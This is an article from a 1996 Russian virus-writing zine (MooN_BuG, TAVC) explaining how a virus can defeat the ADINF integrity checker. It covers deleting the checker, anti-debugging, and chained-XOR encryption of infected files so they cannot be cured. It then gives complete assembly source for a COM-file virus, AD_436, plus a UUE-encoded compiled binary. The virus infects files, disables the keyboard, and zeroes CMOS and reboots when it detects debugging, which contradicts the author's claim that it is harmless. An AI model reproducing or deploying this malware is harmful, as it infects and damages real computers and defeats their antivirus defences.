[TulaAnti&ViralClub] PRESENTS ...
MooN_BuG, Issue 1, September 1996                                     file 003



                           РЕВИЗОР ХУЖЕ ВИРУСА

                                                by igor Dikshew

     Если  вирус обладает защищенностью от самых распространенных и популярных
антивирусных  программ-сканеров  -фагов  и -мониторов, то поверьте, ему нечего
бояться   ревизора!   Конечно,   хорошо  если  такой  вирус  будет  абсолютной
невидимкой,  но во первых это сложно и почти нереализуемо, а во вторых, если и
найти   такую  дырку  в  защите  ревизора,  то  никто  не  гарантирует,  что в
последующих  его  версиях  она  не  будет  устранена.  Тогда как же бороться с
ревизором?  Ну для этого есть несколько способов. Вирус может использовать как
один из них, так и все сразу.
 1. Искать сам ревизор и победоносно удалять его с диска.
 2. Искать таблицы ревизора и удалять их.
 3. Искать таблицы ревизора и править в них соответствующую информацию.
 4. Игнорировать защиту на уровне ревизора, но бороться с лечащим модулем.
     Уже  слышу,  как  вы  говорите,  что  первые три способа не реализуемы по
причине  непостоянства  имен. Конечно это так, но в большинстве случаев, поиск
по имени приведет вас к желательному результату.
     А  вы  не  задумывались,  как это при инсталляции новые версии ревизора и
лечащего  модуля  друг друга находят? Конечно не по имени, а по битовой маске.
Достаточно сравнить три-четыре версии ADINF и вы подберете для себя подходящий
шам.  Да  и  в  таблицах  очень много уникальных байтовых масок, их тоже можно
использовать.
     Третий  способ  действительно  сложно  реализуем,  да  и зависит часто от
версий ADINF. Его рассматривать не будем.
     Итак, остался последний, самый надежный способ борьбы. Почему это так? Да
очень  просто!  Кого  больше сидит за компами: крутых программеров или юзеров?
То-то!  А  если учесть кол-во баг и снесенных ADINF'ом винтов, коя слава давно
уже  числится  за продуктами ДиалогНаука, то еще не всякий "крутой программер"
будет  выбирать  между  риском  на  компах  предприятия и снесением нафиг сего
могучего ревизора. Постараюсь пояснить...
     Из  того  числа  "крутых  программеров", которые обслуживают скажем отдел
АСУП на заводе, едва ли половина из них полезет разбираться с S-ICE по причине
надругательства ADINF'ом над файлом. Либо попытаются протестировать такой файл
полифагами,  что  естественно  не  должно дать никаких результатов (об этом мы
позаботимся), либо снесет нафиг инфицированный файл, что в большинстве случаев
неприемлимо, либо постарается полечить диск с помощью ADINF Cure Module. Будем
надеяться  на  последний и самый вероятный исход, дело в том, что оставить все
как  есть  "программер" тоже не может, хотя нам это глубоко сиренево, но очень
даже пригодиться в последствии.
     Итак,  если  мы предусмотрим невозможность лечения вируса лечащим модулем
или такое лечение будет равносильно "смерти" файла, то мы добьемся своей цели,
так  как  "программер"  будет  вынужден  снести  нафиг ADINF и оставить все до
лучших  времен.  Почему снести и под каким это соусом объяснить начальству? Да
потому  что  оставить  компы, пугающие ежедневно юзеров своими надписями он не
может,  справиться с вирусом он тоже не может, да и вирус ли это, если любимые
DrWeb, AidsTest и AVP молчат?
     Одной  из  главных  ступеней  защиты  вируса  от  несколько  "продвинутых
программеров"  будет являться защита от дебужирования самыми популярными среди
такого  контингента  отладчиками.  Это  Debug,  TD и AFD. Достаточно на первых
порах  просто уйти из под отладчика, что охладит пыл достаточно большого числа
исследователей. Затем перемешать защитный механизм с расшифровкой тела вируса.
Ну и совсем было бы прекрасно организовать стелс механизм.
     Это  все  как кому понравится. Вернемся к главному вопросу противостояния
ревизору  с его примочкой. Что же нужно, чтобы сделать невозможным лечение или
порчу файлов при лечении? Нужно просто похитрее закриптовать сам файл. Если вы
поксорите   тело  программы  с  постоянным  ключом,  то  восстановление  может
оказаться  возможным.  Сложный цикл криптования сильно замедлит работу вируса,
что  тоже  является нежелательным. Важно найти компромисс. Предлагаю следующую
схему  "изувечивания"  программы:  ксорим  первый  байт/слово ключом, а каждый
последующий  ксорим  с  предыдущим.  Это  легко  реализуемо,  занимает немного
времени,  но  является  непреодалимым  барьером для лечащего модуля. Во всяком
случае  до  версии  3.05. Приведу пример простейшего COM вируса, использующего
данный механизм защиты.

=== Cut ===
;                              Вирус AD_436
;                            Семейство Search
;                Поражает все COM файлы в текущем каталоге
;             Шифрует 1кБ начала программы при инфицировании
;                  Абсолютно безвреден, хорошо лечится,
;               но Adinf Cure Module против него бессилен
;----------------------------------------------------------------------------
;           (c) 1996 by I. Dikshew // [TAVC] // -=* Red Arc *=-

Model tiny
.code
.286

org 100h

START:
       jmp VIRUS
       db 100 dup (0adh)
       db 0adh
VIRUS:
       pusha
       push ds es cs
       pop ds

       ;Ступень I - закрываем клаву
       cli
       mov al,0adh
       out 64h,al
       jmp short $+2
       sti

       jmp short BEGIN

       M_Ofs equ $-VIRUS
       FMASK db '*' xor 0adh, '.' xor 0adh, 'c' xor 0adh
             db 'o' xor 0adh, 'm' xor 0adh, 0h  xor 0adh
       B_Ofs equ $-VIRUS
       Byte4 db 0cdh, 20h, 90h, 90h
Set_Dta equ $-VIRUS
        db 1ah
FFirst equ $-VIRUS
        db 4eh
WriteF equ $-VIRUS
        db 40h
FNext equ $-VIRUS
        db 4fh
SAttrFH equ $-VIRUS
        db 43h
CloseF equ $-VIRUS
        db 3eh
SAttrFL equ $-VIRUS
        db 01h
OpenH equ $-VIRUS
        db 3dh
ReadF equ $-VIRUS
        db 3fh
OpenL equ $-VIRUS
        db 02h
SetDF equ $-VIRUS
        db 57h
HanMov equ $-VIRUS
        db 42h

XOR_B   equ $-VIRUS
        db ?

BEGIN:
       ;Ступень защиты II - мешаем исполнению под отладчиком
       push ds
       push si
       mov ds,si
       mov si,0004
       mov [si+02],cs
       pop si
       pop ds

       call My_Entry
BEG_LEN equ $-VIRUS
My_Entry:
       pop bp
       sub bp,BEG_LEN
       xchg si,di
       push bp
       pop si
       add si,B_Ofs
       movsw
       movsw

       ;Ступень защиты III - проверяем пошаговое исполнение
       db 2eh
       pushf
       pop ax
       sahf
       jnb Decrypto
       mov ax,1010h
       out 70h,ax ;обнуляем к херам CMOS
       mov al,0feh
       out 64h,al ;Перезагружаем компьютер

Decrypto:

       ;Открываем клаву
       cli
       mov al,0aeh
       out 64h,al
       jmp short $+2
       sti

       call CRYPTO_IN_MEMORY
       mov ah, byte ptr [bp+Set_Dta]
       mov dx,bp
       push dx
       add dx,VIRLEN
       push dx
       int 21h
       mov ah,byte ptr [bp+FFirst]
       pop si
       pop dx
       add dx,M_Ofs
       call XOR_FileMask
       mov cx,0ffh
       int 21h
       call XOR_FileMask
FIND:
       jb Not_Found
       call Plaque
       mov ah,byte ptr [bp+FNext]
       int 21h
       jmp short FIND
Not_Found:
       mov ah,byte ptr [bp+Set_Dta]
       xor dx,dx
       mov dl,80h
       int 21h
       pop es ds
       popa
       push si
       ret
Plaque:
       mov dx,si
       add dx,1eh
       push dx
       mov ah,byte ptr [bp+SAttrFH]
       mov al,byte ptr [bp+SAttrFL]
       xor cx,cx
       int 21h
       mov ah,byte ptr [bp+OpenH]
       mov al,byte ptr [bp+OpenL]
       int 21h
       jb NextFind
       xchg ax,bx
       mov ah,byte ptr [bp+ReadF]
       push bp
       pop dx
       add dx,B_Ofs
       xor cx,cx
       mov cl,4
       int 21h
       mov al, byte ptr [bp+B_Ofs+3]
       cmp al,0adh
       jz Close_File
       jmp short Infected
Close_File:
        mov ah,byte ptr [bp+SetDF]
        mov al,byte ptr [bp+SAttrFL]
        mov dx,word ptr [si+18h]
        mov cx,word ptr [si+16h]
        int 21h
        mov ah,byte ptr [bp+CloseF]
        int 21h
NextFind:
        mov ah,byte ptr [bp+SAttrFH]
        mov al,byte ptr [bp+SAttrFL]
        pop dx
        mov cx,word ptr [si+15h]
        int 21h
        ret
infected:
        call CRYPTO_IN_FILE
        cld
        mov ah,byte ptr [bp+HanMov]
        mov al,byte ptr [bp+OpenL]
        xor cx,cx
        push cx
        push cx
        pop dx
        push dx
        push bp
        int 21h
        push bp
        pop dx
        mov cx,VIRLEN
        mov ah,byte ptr [bp+WriteF]
        int 21h
        pop di
        pop cx
        pop dx
        add di,B_Ofs
        xor ax,ax
        mov ah,byte ptr [bp+HanMov]
        int 21h
        mov byte ptr [di],0e9h
        mov ax,word ptr [si+1ah]
        sub ax,3
        mov word ptr [di+1],ax
        mov byte ptr [di+3],0adh
        mov cl,4
        xchg dx,di
        mov ah,byte ptr [bp+WriteF]
        int 21h
        jmp Close_File

CRYPTO_IN_MEMORY:
        pusha
        mov si,104h
        mov cx,bp
        sub cx,si
        cmp cx,1024
        jle CIM_1
        mov cx,1020
CIM_1:
        mov ah,byte ptr [si]
        xor ah,0adh
        mov byte ptr [si],ah
        inc si
        loop CIM_1
        popa
        ret

ReadByte:
        pusha
        mov ah,byte ptr [bp+ReadF]
        mov cx,1
        mov dx,si
        int 21h
        popa
        ret

WriteByte:
        pusha
        xor ax,ax
        xor cx,cx
        mov ah,byte ptr [bp+HanMov]
        mov dx,di
        int 21h
        mov ah,byte ptr [bp+WriteF]
        mov cx,1
        mov dx,si
        int 21h
        popa
        ret

CRYPTO_IN_FILE:
        pusha
        xor ax,ax
        xor cx,cx
        xor dx,dx
        push dx
        push dx
        mov ah,byte ptr [bp+HanMov]
        int 21h
        mov cx,word ptr [si+1ah]
        cmp cx,1024
        jle CIF_0
        mov cx,1024
CIF_0:
        mov si,bp
        add si,XOR_B
        pop dx
        pop di
CIF_1:
        call ReadByte
        mov ah,byte ptr [si]
        xor ah,0adh
        mov byte ptr [si],ah
        call WriteByte
        inc di
        loop CIF_1
        popa
        ret

XOR_FileMask:
        pusha
        mov si,dx
        xor cx,cx
        mov cl,6
XFM_1:
        mov al,byte ptr [si]
        xor al,0adh
        mov byte ptr [si],al
        inc si
        loop XFM_1
        popa
        ret

VIRLEN equ $-VIRUS
END Start
=== Cut ===

     Ну  а  для  тех,  кто плохо воспринимает смысл слов с экрана, а компилить
вирь лениво, предлагаю уже готовую реализацию в виде COM программы.

=== Cut ===
section 1 of 1 of file ad_436.lzh    -={ UUE 1.06, ARA (C) 1995 }=-

begin 644 ad_436.lzh  10-25-1996 22:23:0
M(]PM;&@U+9X!```;`@``W1(S(2`!"D%$7S0S-BY#3TVUOTT```%J8G<6-.Q?
MZ]S<;0,V#SG5VZWZU8*9@_VA[;8RO,'A2\-JO`UM!W1L.T;"G8*[_\80T3(P
MV)R52@O,"E+0J=`_0:#;#8%@5^G""(N3.37_48>\0=-`LA4>][?_]+4@^&)V
M3F[6B\#^/>*:U5I46RQ=;6AY/MRL7UH>KV0,SW`4D_?CH)`^RT"5$,`&>US>
MB;UR)351/9V<37S=CX]_>A0N3X3O[:T>R=M7(LW"`;/C)Q+ZE*>@N4(V8<IA
MJE=FQ$'+8"A-A(:7@,F<3R%"]TG+%6W-,H>]$F2:9*[5)1<;/E&K$$Z^Y%&K
M?E#I8?X&R&0>'3$[MI'V%;WTM_*`]%&S@'+)EWI%KQ\]1_X^\P19,H:9OH#M
M&S&/"B=CQV%Y!3PSD]`;-\4.AG,-<"8J)P"AJ77*3&A^9$'UQT*F.BWMI3;%
MP5[\RZ"2!"X=74_8$OFBYVHCC:?2WJQE;/ZF4Y9^,N(`)7*$^05$3IXXEA_@
M]]_M<59=>Y5$6A]T4!(G4U4P6-`V[;[I0V_;R+/.=(G0?M<$:7G;U4E;/7,I
"@`#
`
end
sum -r/size 26947/672 section (from "begin" to "end")
sum -r/size 7181/452 entire input file
=== Cut ===


                                                 (c) by Igor Dikshew [TAVC]
